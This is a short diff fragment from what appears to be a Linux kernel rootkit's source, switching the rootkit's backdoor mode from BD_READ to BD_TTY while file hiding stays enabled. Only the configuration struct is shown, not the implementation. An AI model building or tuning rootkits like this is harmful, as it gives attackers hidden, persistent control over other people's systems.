@@ -41,7 +41,7 @@ static struct file_operations g7_fops =
 
 rootkit_t rootkit = {
     .hiding_files = true,
-    .backdoor = BD_READ,
+    .backdoor = BD_TTY,
 };
 
 
